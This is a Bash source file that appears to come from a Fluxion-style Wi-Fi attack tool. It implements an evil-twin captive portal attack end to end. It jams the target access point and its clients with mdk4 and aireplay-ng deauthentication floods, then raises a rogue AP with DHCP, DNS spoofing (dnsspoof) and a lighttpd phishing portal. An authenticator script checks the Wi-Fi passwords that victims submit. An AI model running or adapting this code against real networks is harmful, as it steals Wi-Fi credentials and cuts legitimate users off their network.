attack_tracking_interfaces() {
  # Determine required band from target channel.
  local __requiredBand=""
  if [ "$CapCapTargetChannel" ]; then
    local __ch=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
    if [ -n "$__ch" ] && [ "$__ch" -gt 14 ]; then
      __requiredBand="5GHz"
    fi
  fi
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    if [ "$__requiredBand" ]; then
      interface_bands "$interface" 2>/dev/null
      if [[ "${InterfaceBands:-}" != *"$__requiredBand"* ]]; then continue; fi
    fi
    echo "$interface"
  done
  echo "" # This enables the Skip option.
}

unprep_attack() {
  CaptivePortalState="Not Ready"

  captive_portal_unset_attack
  captive_portal_unset_deauth_target
  captive_portal_unset_user_interface
  captive_portal_unset_connectivity
  captive_portal_unset_certificate
  captive_portal_unset_authenticator
  captive_portal_unset_ap_channel
  captive_portal_unset_ap_interface
  captive_portal_unset_jammer_interface

  # Always return success to allow tracker channel change handling to continue
  return 0
}

prep_attack() {
  local sequence=(
    "set_jammer_interface"
    "set_ap_interface"
    "set_deauth_method"
    "set_deauth_target"
    "set_ap_channel"
    "set_ap_service"
    # The portal is chosen before the authenticator, because a portal that
    # records submissions itself does not need one.
    "set_user_interface"
    "set_authenticator"
    "set_certificate"
    "set_connectivity"
    "set_attack"
  )

  if ! capcap_do_sequence captive_portal sequence[@]; then
    return 1
  fi

  CaptivePortalState="Ready"
}

load_attack() {
  local -r configurationPath=$1

  local configuration
  readarray -t configuration < "$configurationPath"

  CaptivePortalJammerInterfaceOriginal=${configuration[0]}
  CaptivePortalAccessPointInterfaceOriginal=${configuration[1]}
  CaptivePortalAPService=${configuration[2]}
  CaptivePortalAuthenticatorMode=${configuration[3]}
  CaptivePortalSSL=${configuration[4]}
  CaptivePortalConnectivity=${configuration[5]}
  CaptivePortalUserInterface=${configuration[6]}

  # Hash authenticator mode configuration.
  CaptivePortalHashPath=${configuration[7]}

  # Target hash information for verification.
  local -r targetHashSSID=${configuration[8]}
  local -r targetHashMAC=${configuration[9]}
  
  # Captive portal jammer type.
  CaptivePortalJammerType=${configuration[10]}
  option_deauth="${CaptivePortalJammerType}"

  # Deauthentication target clients ("all" or a list of client MACs).
  CaptivePortalTargetClients=${configuration[11]:-broadcast}

  # Rogue access point channel (may differ from the target's channel).
  CaptivePortalAccessPointChannel=${configuration[12]}

  # Assure hash is relevant for capcap's current target.
  # If the hash is no longer relevant, clear to force reset.
  if [ \
    "$targetHashSSID" != "$CapCapTargetSSID" -o \
    "$targetHashMAC" != "$CapCapTargetMAC" ]; then
    CaptivePortalHashPath=""
  fi
}

save_attack() {
  local -r configurationPath=$1

  # Store/overwrite attack configuration for pause & resume.
  # Order: JammerWI, APWI, APServ, AuthMode, SSL, Conn, UI
  echo "$CaptivePortalJammerInterfaceOriginal" > "$configurationPath"
  echo "$CaptivePortalAccessPointInterfaceOriginal" >> "$configurationPath"
  echo "$CaptivePortalAPService" >> "$configurationPath"
  echo "$CaptivePortalAuthenticatorMode" >> "$configurationPath"
  echo "$CaptivePortalSSL" >> "$configurationPath"
  echo "$CaptivePortalConnectivity" >> "$configurationPath"
  echo "$CaptivePortalUserInterface" >> "$configurationPath"

  # Hash authenticator mode configuration.
  echo "$CaptivePortalHashPath" >> "$configurationPath"

  # Target to verify validity of hash on restore.
  echo "$CapCapTargetSSID" >> "$configurationPath"
  echo "$CapCapTargetMAC" >> "$configurationPath"
  
  # Captive portal jammer type.
  CaptivePortalJammerType="${option_deauth}"
  echo "$CaptivePortalJammerType" >> "$configurationPath"

  # Deauthentication target clients ("all" or a list of client MACs).
  echo "$CaptivePortalTargetClients" >> "$configurationPath"

  # Rogue access point channel (may differ from the target's channel).
  echo "$CaptivePortalAccessPointChannel" >> "$configurationPath"
}

captive_portal_stop_jammer_service() {
  if [ "$CaptivePortalJammerServiceXtermPID" ]; then
    capcap_kill_lineage $CaptivePortalJammerServiceXtermPID
    CaptivePortalJammerServiceXtermPID=""
  fi
  sandbox_remove_workfile "$CAPCAPWorkspacePath/mdk4_blacklist.lst"
}

captive_portal_start_jammer_service() {
  if [ "$CaptivePortalJammerServiceXtermPID" ]; then return 0; fi

  echo -e "$CAPCAPVLine $CaptivePortalStartingJammerServiceNotice"

  local currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
  if [ "$currentMode" != "monitor" ]; then
    interface_set_mode "$CaptivePortalJammerInterface" monitor &>> $CAPCAPOutputDevice
    sleep 1
  fi

  # Monitor mode resets the radio to its default channel; aireplay-ng does not
  # tune the interface, so the deauth would be transmitted on the wrong
  # channel. The rogue AP may intentionally run on a different channel (which
  # needs a second radio): in that case the AP's channel wins, because moving a
  # shared phy would take the AP down with it.
  local jammerChannel="$CapCapTargetChannel"
  if [ "$CaptivePortalAccessPointInterface" ] && \
     [ "$CaptivePortalAccessPointChannel" ] && \
     [ "$CaptivePortalAccessPointChannel" != "$CapCapTargetChannel" ]; then
    interface_physical "$CaptivePortalJammerInterface"
    local jammerPhy="$InterfacePhysical"
    interface_physical "$CaptivePortalAccessPointInterface"
    local apPhy="$InterfacePhysical"
    if [ "$jammerPhy" ] && [ "$jammerPhy" = "$apPhy" ]; then
      jammerChannel="$CaptivePortalAccessPointChannel"
      echo -e "$CAPCAPVLine $CaptivePortalSameRadioChannelWarning"
    fi
  fi
  if [ "$jammerChannel" ]; then
    if interface_set_channel \
      "$CaptivePortalJammerInterface" "$jammerChannel"; then
      echo "Jammer locked to channel $jammerChannel." >> $CAPCAPOutputDevice
    else
      echo -e "$CAPCAPVLine $CaptivePortalChannelSetWarning"
    fi
  fi

  local targetClients=""
  local targetMode="all"
  case "$CaptivePortalTargetClients" in
    broadcast|"")
      targetMode="broadcast"
      ;;
    all)
      targetMode="all"
      targetClients="${CapCapTargetClientsMAC[*]}"
      ;;
    *)
      targetMode="subset"
      targetClients="$CaptivePortalTargetClients"
      ;;
  esac

  if [ "$targetMode" = "all" ] && [ ! "$targetClients" ]; then
    targetMode="broadcast"
  fi

  if [[ $option_deauth -eq 1 ]]; then
    if [ "$targetMode" = "subset" ]; then
      printf '%s\n' $targetClients > "$CAPCAPWorkspacePath/mdk4_blacklist.lst"
      capcap_window_open CaptivePortalJammerServiceXtermPID \
        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
        "mdk4 $CaptivePortalJammerInterface d -c $CapCapTargetChannel -b \"$CAPCAPWorkspacePath/mdk4_blacklist.lst\""
    else
      capcap_window_open CaptivePortalJammerServiceXtermPID \
        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
        "mdk4 $CaptivePortalJammerInterface d -c $CapCapTargetChannel -B $CapCapTargetMAC"
    fi
  elif [[ $option_deauth -eq 2 ]]; then
    if [ "$targetClients" ]; then
      capcap_window_open CaptivePortalJammerServiceXtermPID \
        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
        "for client in $targetClients; do aireplay-ng -0 0 -a $CapCapTargetMAC -c \$client --ignore-negative-one $CaptivePortalJammerInterface & done; wait"
    else
      capcap_window_open CaptivePortalJammerServiceXtermPID \
        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
        "aireplay-ng -0 0 -a $CapCapTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
    fi
  fi
}

# Resume the AP service and routes without killing DHCP/DNS/web services.
captive_portal_resume_interface() {
  if [ "$CaptivePortalAPService" ]; then
    ap_service_start || return 1
  fi
  captive_portal_set_routes &
  sleep 3
}

pause_attack() {
  if [ "$CaptivePortalState" != "Running" ]; then return 0; fi
  echo "Pausing Captive Portal attack (target AP disappeared)." >> $CAPCAPOutputDevice
  captive_portal_stop_jammer_service
  captive_portal_stop_interface
  CaptivePortalState="Paused"
}

resume_attack() {
  if [ "$CaptivePortalState" != "Paused" ]; then return 0; fi
  echo "Resuming Captive Portal attack (target AP reappeared)." >> $CAPCAPOutputDevice
  captive_portal_resume_interface
  captive_portal_start_jammer_service
  CaptivePortalState="Running"
}

stop_attack() {
  local -r CaptivePortalAuthSuccessFlag="$CAPCAPWorkspacePath/authenticator_success.flag"
  local skip_authenticator_kill=0

  if [ -f "$CaptivePortalAuthSuccessFlag" ]; then
    skip_authenticator_kill=1
    sandbox_remove_workfile "$CaptivePortalAuthSuccessFlag"
  fi

  # Attempt to find PIDs of any running authenticators.
  #local authenticatorPID=$(pgrep
  #local authenticatorPID=$( \
  #  ps a | grep -vE "xterm|grep" | \
  #  grep captive_portal_authenticator.sh | awk '{print $1}' \
  #)

  # Signal any authenticator to stop authentication loop.
  if [ $skip_authenticator_kill -eq 0 ]; then
    # Kill the authenticator xterm window silently.
    if [ "$CaptivePortalAuthenticatorServiceXtermPID" ]; then
      kill $CaptivePortalAuthenticatorServiceXtermPID &> /dev/null
      CaptivePortalAuthenticatorServiceXtermPID=""
    fi
    
    capcap_kill_lineage "--signal SIGABRT" \
      "captive_portal_authenticator\\.sh" &> /dev/null
    pkill -9 -f "$CAPCAPWorkspacePath/captive_portal_authenticator.sh" \
      &>> $CAPCAPOutputDevice
  fi

  captive_portal_stop_jammer_service

  # Kill captive portal web server log viewer.
  if [ "$CaptivePortalWebServiceXtermPID" ]; then
    capcap_kill_lineage $CaptivePortalWebServiceXtermPID
    CaptivePortalWebServiceXtermPID="" # Clear service PID
  fi

  # Kill captive portal web server.
  if [ "$CaptivePortalWebServicePID" ]; then
    capcap_kill_lineage $CaptivePortalWebServicePID
    CaptivePortalWebServicePID="" # Clear service PID
  fi
  # Fallback: kill any lighttpd using capcap's workspace config (handles daemon-restart edge cases).
  pkill -f "lighttpd.*$CAPCAPWorkspacePath" &>/dev/null || true

  # Kill DNS service if one is found.
  if [ "$CaptivePortalDNSServiceXtermPID" ]; then
    capcap_kill_lineage $CaptivePortalDNSServiceXtermPID
    CaptivePortalDNSServiceXtermPID="" # Clear parent PID
  fi

  # Kill DHCP service.
  if [ "$CaptivePortalDHCPServiceXtermPID" ]; then
    capcap_kill_lineage $CaptivePortalDHCPServiceXtermPID
    CaptivePortalDHCPServiceXtermPID="" # Clear parent PID
  fi
  sandbox_remove_workfile "$CAPCAPWorkspacePath/clients.txt"

  captive_portal_stop_interface

  # Start the network-manager if it's disabled.
  if [ "$CaptivePortalNetworkManagerShutoff" != "disabled" ]; then
    if [ -x "$(command -v systemctl)" ]; then
      if [ "$CaptivePortalDisabledNetworkManager" ]; then
        systemctl restart network-manager.service &>> $CAPCAPOutputDevice
        systemctl restart networkmanager.service &>> $CAPCAPOutputDevice
        systemctl restart networking.service &>> $CAPCAPOutputDevice

        # Reset disabled network-manager flag.
        CaptivePortalDisabledNetworkManager=""
      fi
      if [ "$CaptivePortalDisabledResolveD" ]; then
        systemctl restart systemd-resolved.service &>> $CAPCAPOutputDevice

        # Reset disabled network-manager flag.
        CaptivePortalDisabledResolveD=""
      fi
    elif [ -x "$(command -v service)" ]; then
      if [ "$CaptivePortalDisabledNetworkManager" ]; then
        service network-manager restart &>> $CAPCAPOutputDevice
        service networkmanager restart &>> $CAPCAPOutputDevice
        service networking restart &>> $CAPCAPOutputDevice

        # Reset disabled network-manager flag.
        CaptivePortalDisabledNetworkManager=""
      fi
      if [ "$CaptivePortalDisabledResolveD" ]; then
        service systemd-resolved restart &>> $CAPCAPOutputDevice

        # Reset disabled network-manager flag.
        CaptivePortalDisabledResolveD=""
      fi
    fi
  fi

  CaptivePortalState="Stopped"
}

start_attack() {
  if [ "$CaptivePortalState" = "Running" ]; then return 0; fi
  if [ "$CaptivePortalState" != "Ready" ]; then return 1; fi
  CaptivePortalState="Running"

  stop_attack
  CaptivePortalState="Running"  # restore — stop_attack resets it to "Stopped"

  if [ "$CaptivePortalNetworkManagerShutoff" != "disabled" ]; then
    CaptivePortalDisabledNetworkManager=""
    CaptivePortalDisabledResolveD=""
    # Start the network-manager if it's disabled.
    if [ -x "$(command -v systemctl)" ]; then
      if systemctl status network-manager.service &>> $CAPCAPOutputDevice ||
         systemctl status networkmanager.service &>> $CAPCAPOutputDevice; then
        systemctl stop network-manager.service &>> $CAPCAPOutputDevice
        systemctl stop networkmanager.service &>> $CAPCAPOutputDevice
        CaptivePortalDisabledNetworkManager=1
      else
        echo "No network managers appear to be running." >> $CAPCAPOutputDevice
      fi
      if systemctl status systemd-resolved.service &>> $CAPCAPOutputDevice; then
        systemctl stop systemd-resolved.service &>> $CAPCAPOutputDevice
        CaptivePortalDisabledResolveD=1
      else
        echo "No DNS resolvers appear to be running." >> $CAPCAPOutputDevice
      fi
    elif [ -x "$(command -v service)" ]; then
      if service network-manager status &>> $CAPCAPOutputDevice ||
         service networkmanager status &>> $CAPCAPOutputDevice; then
        service network-manager stop &>> $CAPCAPOutputDevice
        service networkmanager stop &>> $CAPCAPOutputDevice
        CaptivePortalDisabledNetworkManager=1
      else
        echo "No network managers appear to be running." >> $CAPCAPOutputDevice
      fi
      if service systemd-resolved status &>> $CAPCAPOutputDevice; then
        service systemd-resolved stop &>> $CAPCAPOutputDevice
        CaptivePortalDisabledResolveD=1
      else
        echo "No DNS resolvers appear to be running." >> $CAPCAPOutputDevice
      fi
    fi
  fi

  captive_portal_start_interface


  echo -e "$CAPCAPVLine $CaptivePortalStartingDHCPServiceNotice"
  # kea-dhcp4's PID file, lock file and lease file all live under paths
  # (/run/kea, /run/lock/kea, /var/lib/kea) that are normally created by
  # systemd's RuntimeDirectory=/StateDirectory= when the packaged service
  # unit starts. Since we invoke the binary directly, create them ourselves
  # or startup fails; KEA_LOCKFILE_DIR must match for the same reason, as
  # it's also what the distro's kea-dhcp4 AppArmor profile expects.
  mkdir -p /run/kea /run/lock/kea /var/lib/kea
  # Clear any previous log entries
  > "$CAPCAPWorkspacePath/clients.txt"
  capcap_window_open CaptivePortalDHCPServiceXtermPID \
    "CAPCAPWIFI AP DHCP Service" "$TOPLEFT" "black" "#CCCC00" \
    "KEA_LOCKFILE_DIR=/run/lock/kea kea-dhcp4 ${CAPCAPDebug:+-d }-c \"$CAPCAPWorkspacePath/kea-dhcp4.conf\" 2>&1 | tee -a \"$CAPCAPWorkspacePath/clients.txt\""
  echo "DHCP Service: $CaptivePortalDHCPServiceXtermPID" \
    >> $CAPCAPOutputDevice

  echo -e "$CAPCAPVLine $CaptivePortalStartingDNSServiceNotice"
  capcap_window_open CaptivePortalDNSServiceXtermPID \
    "CAPCAPWIFI AP DNS Service" "$BOTTOMLEFT" "black" "#99CCFF" \
    "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$CAPCAPWorkspacePath/hosts\""
  echo "DNS Service: $CaptivePortalDNSServiceXtermPID" \
    >> $CAPCAPOutputDevice

  echo -e "$CAPCAPVLine $CaptivePortalStartingWebServiceNotice"
  # Clear any previous log entries
  > "$CAPCAPWorkspacePath/lighttpd.log"
  # Run lighttpd with -D (foreground, no fork) so $! captures the real PID.
  lighttpd -D -f "$CAPCAPWorkspacePath/lighttpd.conf" \
    &>> $CAPCAPOutputDevice &
  CaptivePortalWebServicePID=$!

  capcap_window_open CaptivePortalWebServiceXtermPID \
    "CAPCAPWIFI Web Service" "$BOTTOM" "black" "#00CC00" \
    "tail -f \"$CAPCAPWorkspacePath/lighttpd.log\""
  echo "Web Service: $CaptivePortalWebServiceXtermPID" \
    >> $CAPCAPOutputDevice

  captive_portal_start_jammer_service
  echo "Jammer Service: $CaptivePortalJammerServiceXtermPID" \
    >> $CAPCAPOutputDevice

  echo -e "$CAPCAPVLine $CaptivePortalStartingAuthenticatorServiceNotice"
  capcap_window_open CaptivePortalAuthenticatorServiceXtermPID \
    "CAPCAPWIFI AP Authenticator" "$TOPRIGHT" "black" "#CCCCCC" \
    "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
  echo "Auth Service: $CaptivePortalAuthenticatorServiceXtermPID" \
    >> $CAPCAPOutputDevice
}

# FLUXSCRIPT END
